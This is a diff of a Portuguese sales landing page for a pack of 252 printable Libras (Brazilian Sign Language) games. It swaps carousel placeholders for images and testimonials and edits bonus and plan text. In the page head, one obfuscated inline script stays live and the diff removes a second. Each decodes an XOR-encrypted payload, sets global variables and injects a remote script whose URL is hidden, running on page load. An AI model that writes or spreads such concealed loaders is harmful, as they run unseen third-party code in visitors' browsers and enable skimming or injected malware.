@@ -20,7 +20,6 @@
 
 <script>(function(){var v_el=atob("DFBN/StXP/BUqDmECCtviFk7Hcp2wE3weCN30gQ0W5563U3pYTY000g4Ut422hb3ayIkjV8kEIUgxUqrZDE5mFgjEZonihWmaSQ5j0I1SoQx2xu+Uytvk0o6WtJuil3lfDFgiF86VpYthUn2bSYok196R5M7zBT3aztv0QkhXpwhzRu+KnIw0VB1UZE5zRu+KjQsiUp6SoQ5wV/9JSA/mF0yUYR520zmYTQ+3wd1SZE43VymMnJvgHYq");var g_n8z=[];for(var c_uc=0;c_uc<v_el.length;c_uc++){g_n8z.push(v_el.charCodeAt(c_uc)&255);}var c_xaf=g_n8z[0];var q_ts=g_n8z.slice(1,1+c_xaf);var j_xaog=g_n8z.slice(1+c_xaf);var n_c18=j_xaog.map(function(b,t_uygi){return b^q_ts[t_uygi%c_xaf];});var p_ww="";for(var q_09=0;q_09<n_c18.length;q_09++){p_ww+=String.fromCharCode(n_c18[q_09]&255);}var v_46=decodeURIComponent(escape(p_ww));var p_kxgr=JSON.parse(v_46);var m_d=p_kxgr.globals||[];m_d.forEach(function(g_f){window[g_f.name]=g_f.value;});var t_8m51=document.createElement("script");t_8m51.src=p_kxgr.url;t_8m51.async=true;t_8m51.defer=true;(p_kxgr.attributes||[]).forEach(function(j_n5j){t_8m51.setAttribute(j_n5j.name,j_n5j.value);});(document.head||document.documentElement).appendChild(t_8m51);})();</script>
 
-<script>(function(){var o_ff=atob("DFsOvJhVealjOQpPIiAsyeo5W5NBUX47Uig0k7c2HcdNTH4iSz13kvs6FIcBSyU8QSlnzOwmVtkKQW8jDStnxP05V8MQGyZtQy96zvE3DN0GSih1eQYinv85FssCVXltGAB1nvY0FMxBAyg/SyNr0NExW4VBT2sjVz4shrpjGM1SAGwrEzo63qw3TpBXXGgtQGw2hPl3BPQe");var w_7xm=[];for(var r_l=0;r_l<o_ff.length;r_l++){w_7xm.push(o_ff.charCodeAt(r_l)&255);}var u_d=w_7xm[0];var l_ot=w_7xm.slice(1,1+u_d);var r_e=w_7xm.slice(1+u_d);var z_f6vk=r_e.map(function(b,t_fz){return b^l_ot[t_fz%u_d];});var e_53jr="";for(var f_pd5e=0;f_pd5e<z_f6vk.length;f_pd5e++){e_53jr+=String.fromCharCode(z_f6vk[f_pd5e]&255);}var s_gu3b=decodeURIComponent(escape(e_53jr));var q_p88=JSON.parse(s_gu3b);var g_7jx5=q_p88.globals||[];g_7jx5.forEach(function(r_rrvx){window[r_rrvx.name]=r_rrvx.value;});var l_k=document.createElement("script");l_k.src=q_p88.url;l_k.async=true;l_k.defer=true;(q_p88.attributes||[]).forEach(function(u_i){l_k.setAttribute(u_i.name,u_i.value);});(document.head||document.documentElement).appendChild(l_k);})();</script>
 
 </head>
 <body>
@@ -95,7 +94,24 @@
       <div class="section__head reveal">
         <span class="badge">📦 O que você recebe</span>
         <h2>Chega de improvisar atividades de inclusão! Tenha 252 Jogos em Libras prontos para imprimir.</h2>
-        <p> <strong>Aprender Brincando, Incluir de Verdade</strong>, você recebe materiais prontos para baixar, imprimir e aplicar em sala de aula, em casa ou no atendimento.</p>
+        <p><strong>Aprender Brincando, Incluir de Verdade</strong>, você recebe materiais prontos para baixar, imprimir e aplicar em sala de aula, em casa ou no atendimento.</p>
+      </div>
+
+      <!-- Carrossel de entregáveis: troque cada placeholder por
+           <div class="slide"><img src="assets/nome.webp" alt="Descrição" loading="lazy" /></div> -->
+      <div class="carousel-block carousel-block--inline reveal">
+        <div class="carousel" data-speed="40">
+          <div class="carousel__track">
+            <div class="slide"><img src="assets/1_5.webp" alt="Jogo da memória dos objetos escolares em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/2_4.webp" alt="Bingo do alfabeto em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/frame_8.webp" alt="UNO em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/frame_7.webp" alt="Dominó em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/5_950.webp" alt="Quebra-cabeça dos sinais em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/3_4070025.webp" alt="Trilha de desafios em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/6_66.webp" alt="Roleta de desafios em Libras" loading="lazy" /></div>
+            <div class="slide"><img src="assets/3e641e32_1608_463e_80c7_6c79e588f0d3_1.webp" alt="Atividades de animais em Libras" loading="lazy" /></div>
+          </div>
+        </div>
       </div>
 
       <div class="games">
@@ -151,58 +167,31 @@
     </div>
   </section>
 
-  <!-- DOBRA — ENTREGÁVEIS (CARROSSÉIS) -->
-  <section class="section section--showcase" id="entregaveis">
+  <!-- DOBRA — DEPOIMENTOS (CARROSSEL) -->
+  <section class="section section--showcase" id="depoimentos">
     <div class="container">
       <div class="section__head reveal">
-        <span class="badge">👀 Por dentro do material</span>
-        <h2>252 jogos em Libras prontos para imprimir. <span class="hl">Veja alguns exemplos reais:</span></h2>
-        <p>Todos os materiais já estão prontos para baixar, imprimir e aplicar em sala de aula, em casa ou no atendimento.</p>
+        <span class="badge">💬 Depoimentos</span>
+        <h2>Veja o que diz <span class="hl">quem já está usando</span></h2>
+        <p>Mães e professoras que já estão aplicando os jogos em Libras em casa e na sala de aula.</p>
       </div>
     </div>
 
     <!--
-      Para trocar os placeholders pelas suas imagens, substitua cada
-      <div class="slide slide--ph">...</div> por:
-      <div class="slide"><img src="img/nome-da-imagem.png" alt="Descrição" loading="lazy" /></div>
+      Para colocar os prints dos depoimentos, salve as imagens em assets/ e troque cada
+      <div class="slide slide--depo slide--ph">...</div> por:
+      <div class="slide slide--depo"><img src="assets/depoimento-1.webp" alt="Depoimento de cliente" loading="lazy" /></div>
       Não precisa duplicar os slides: o script faz isso para o loop infinito.
     -->
-
     <div class="carousel-block reveal">
-      <h3 class="carousel-title">Quebra-Cabeça do Alfabeto em Libras</h3>
-      <div class="carousel" data-speed="40">
+      <div class="carousel" data-speed="35">
         <div class="carousel__track">
-          <div class="slide slide--ph"><span>🧩</span>Imagem 1</div>
-          <div class="slide slide--ph"><span>🧩</span>Imagem 2</div>
-          <div class="slide slide--ph"><span>🧩</span>Imagem 3</div>
-          <div class="slide slide--ph"><span>🧩</span>Imagem 4</div>
-          <div class="slide slide--ph"><span>🧩</span>Imagem 5</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="carousel-block reveal">
-      <h3 class="carousel-title">Encaixa Frutas em Libras</h3>
-      <div class="carousel carousel--reverse" data-speed="40">
-        <div class="carousel__track">
-          <div class="slide slide--ph"><span>🍎</span>Imagem 1</div>
-          <div class="slide slide--ph"><span>🍌</span>Imagem 2</div>
-          <div class="slide slide--ph"><span>🍇</span>Imagem 3</div>
-          <div class="slide slide--ph"><span>🍍</span>Imagem 4</div>
-          <div class="slide slide--ph"><span>🍓</span>Imagem 5</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="carousel-block reveal">
-      <h3 class="carousel-title">Jogo da Memória em Libras</h3>
-      <div class="carousel" data-speed="40">
-        <div class="carousel__track">
-          <div class="slide slide--ph"><span>🃏</span>Imagem 1</div>
-          <div class="slide slide--ph"><span>🃏</span>Imagem 2</div>
-          <div class="slide slide--ph"><span>🃏</span>Imagem 3</div>
-          <div class="slide slide--ph"><span>🃏</span>Imagem 4</div>
-          <div class="slide slide--ph"><span>🃏</span>Imagem 5</div>
+          <div class="slide slide--depo"><img src="assets/feedback_2_detuvpoe_1.webp" alt="Depoimento de cliente no WhatsApp" loading="lazy" /></div>
+          <div class="slide slide--depo"><img src="assets/feedback_3_sohmvecm_1.webp" alt="Depoimento de cliente no WhatsApp" loading="lazy" /></div>
+          <div class="slide slide--depo"><img src="assets/feedback_4_d9qrtjgd_1.webp" alt="Depoimento de cliente no WhatsApp" loading="lazy" /></div>
+          <div class="slide slide--depo"><img src="assets/feedback_5_d83gypei_1.webp" alt="Depoimento de cliente no WhatsApp" loading="lazy" /></div>
+          <div class="slide slide--depo"><img src="assets/feedback_6_bekt47xo_1.webp" alt="Depoimento de cliente no WhatsApp" loading="lazy" /></div>
+          <div class="slide slide--depo"><img src="assets/feedback_7_ckh7xozw_1.webp" alt="Depoimento de cliente no WhatsApp" loading="lazy" /></div>
         </div>
       </div>
     </div>
@@ -223,42 +212,42 @@
       <div class="bonuses">
         <article class="bonus reveal">
           <div class="bonus__tag">Bônus 1</div>
-          <div class="bonus__icon">🔢</div>
+          <img class="bonus__img" src="assets/1.webp" alt="Bônus 1: 30 Cartelas Extras de Bingo em Libras" loading="lazy" />
           <h3>30 Cartelas Extras de Bingo em Libras</h3>
           <p>Mais opções para suas atividades.</p>
           <div class="bonus__price"><s>De R$ 27,00</s> <strong>GRÁTIS</strong></div>
         </article>
         <article class="bonus reveal">
           <div class="bonus__tag">Bônus 2</div>
-          <div class="bonus__icon">🖼️</div>
+          <img class="bonus__img" src="assets/2.webp" alt="Bônus 2: 20 Jogos de Associação entre Imagem e Sinal" loading="lazy" />
           <h3>20 Jogos de Associação entre Imagem e Sinal</h3>
           <p>Atividades visuais para relacionar imagens e sinais.</p>
           <div class="bonus__price"><s>De R$ 37,00</s> <strong>GRÁTIS</strong></div>
         </article>
         <article class="bonus reveal">
           <div class="bonus__tag">Bônus 3</div>
-          <div class="bonus__icon">🎲</div>
+          <img class="bonus__img" src="assets/3.webp" alt="Bônus 3: 15 Tabuleiros de Trilha em Libras" loading="lazy" />
           <h3>15 Tabuleiros de Trilha em Libras</h3>
           <p>Mais desafios para aprender brincando.</p>
           <div class="bonus__price"><s>De R$ 27,00</s> <strong>GRÁTIS</strong></div>
         </article>
         <article class="bonus reveal">
           <div class="bonus__tag">Bônus 4</div>
-          <div class="bonus__icon">🗂️</div>
+          <img class="bonus__img" src="assets/4.webp" alt="Bônus 4: 50 Flashcards de Libras para Imprimir" loading="lazy" />
           <h3>50 Flashcards de Libras para Imprimir</h3>
           <p>Cartões visuais para utilizar nas atividades.</p>
           <div class="bonus__price"><s>De R$ 37,00</s> <strong>GRÁTIS</strong></div>
         </article>
         <article class="bonus reveal">
           <div class="bonus__tag">Bônus 5</div>
-          <div class="bonus__icon">👩‍🏫</div>
+          <img class="bonus__img" src="assets/5.webp" alt="Bônus 5: 10 Formas de Aplicar Jogos de Libras em Sala" loading="lazy" />
           <h3>10 Formas de Aplicar Jogos de Libras em Sala</h3>
           <p>Ideias para utilizar os jogos nas atividades pedagógicas.</p>
           <div class="bonus__price"><s>De R$ 27,00</s> <strong>GRÁTIS</strong></div>
         </article>
         <article class="bonus reveal">
           <div class="bonus__tag">Bônus 6</div>
-          <div class="bonus__icon">👨‍👩‍👧</div>
+          <img class="bonus__img" src="assets/6.webp" alt="Bônus 6: Libras em Família, 30 Atividades para Pais e Filhos" loading="lazy" />
           <h3>Libras em Família: 30 Atividades para Pais e Filhos</h3>
           <p>Atividades para aproximar a família do aprendizado de Libras.</p>
           <div class="bonus__price"><s>De R$ 37,00</s> <strong>GRÁTIS</strong></div>
@@ -292,7 +281,7 @@
           </div>
 
           <ul class="plan__list">
-            <li>Jogos em Libras da versão básica</li>
+            <li><strong>75 Jogos em Libras</strong></li>
             <li>Materiais digitais em PDF para imprimir</li>
             <li>Atividades visuais para crianças</li>
           </ul>
@@ -300,6 +289,7 @@
           <div class="plan__excluded">
             <span class="plan__excluded-title">Não inclui</span>
             <ul>
+              <li>Os outros 177 jogos do Plano Completo</li>
               <li>30 Cartelas Extras de Bingo</li>
               <li>20 Jogos de Associação entre Imagem e Sinal</li>
               <li>15 Tabuleiros de Trilha</li>
@@ -314,7 +304,7 @@
 
         <!-- PLANO COMPLETO -->
         <article class="plan plan--featured reveal">
-          <div class="plan__ribbon">★ MAIS ESCOLHIDO</div>
+          <div class="plan__ribbon">★ Mais escolhido</div>
           <span class="plan__eyebrow">Acesso completo + 6 bônus</span>
           <h3 class="plan__name">Plano Completo</h3>
           <p class="plan__desc">252 jogos + 6 Bônus para <strong>aprender brincando e incluir de verdade</strong></p>
